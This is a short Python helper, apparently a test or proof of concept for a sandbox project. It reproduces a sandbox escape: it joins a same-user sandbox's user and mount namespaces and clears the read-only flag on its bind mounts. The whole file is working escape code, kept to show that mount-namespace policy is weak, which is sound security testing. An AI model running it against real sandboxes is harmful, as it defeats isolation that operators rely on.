"""Act as a process of the same user: reach into a live sandbox and clear a mount flag.

This is the escape the architect reproduced. The sandbox's mounts belong to a
user namespace the invoking user created, so a same-user process may enter that
namespace and its mount namespace and clear ``MS_RDONLY`` on a bind the sandbox
set up. A policy that lives in the mount namespace cannot survive that; one
attached to the child's own credentials can.

Usage: sandbox_userns_escape_helper.py LAUNCHER_PID DIRECTORY
Prints ``CLEARED`` once the directory's mounts are writable, else the error.
"""

import ctypes
import fcntl
import os
import struct
import sys
from pathlib import Path

NS_GET_USERNS = 0xB701
CLONE_NEWUSER = 0x10000000
CLONE_NEWNS = 0x00020000
AT_FDCWD = -100
AT_RECURSIVE = 0x8000
MOUNT_ATTR_RDONLY = 0x1
SYS_MOUNT_SETATTR = 442


def _children(pid: int) -> list[int]:
    found = []
    for entry in Path("/proc").iterdir():
        if not entry.name.isdigit():
            continue
        try:
            fields = (entry / "stat").read_text(encoding="ascii").rsplit(")", 1)[1]
        except OSError:
            continue
        if int(fields.split()[1]) == pid:
            found.append(int(entry.name))
    return found


def _leaf(pid: int, own_mount_namespace: Path) -> int:
    """Return the deepest descendant that lives in a different mount namespace."""
    best = pid
    frontier = [pid]
    while frontier:
        following = []
        for candidate in frontier:
            for child in _children(candidate):
                namespace = Path(f"/proc/{child}/ns/mnt").readlink()
                if namespace != own_mount_namespace:
                    best = child
                following.append(child)
        frontier = following
    return best


def main(launcher: int, directory: str) -> None:
    child = _leaf(launcher, Path("/proc/self/ns/mnt").readlink())
    mount_namespace = os.open(f"/proc/{child}/ns/mnt", os.O_RDONLY)
    owner = fcntl.ioctl(mount_namespace, NS_GET_USERNS, 0)
    os.setns(owner, CLONE_NEWUSER)
    os.setns(mount_namespace, CLONE_NEWNS)
    attribute = struct.pack("QQQQ", 0, MOUNT_ATTR_RDONLY, 0, 0)
    libc = ctypes.CDLL(None, use_errno=True)
    result = libc.syscall(
        SYS_MOUNT_SETATTR, AT_FDCWD, directory.encode(), AT_RECURSIVE, attribute, 32
    )
    if result != 0:
        sys.stdout.write(f"FAILED errno {ctypes.get_errno()}\n")
        return
    sys.stdout.write("CLEARED\n")


if __name__ == "__main__":
    main(int(sys.argv[1]), sys.argv[2])
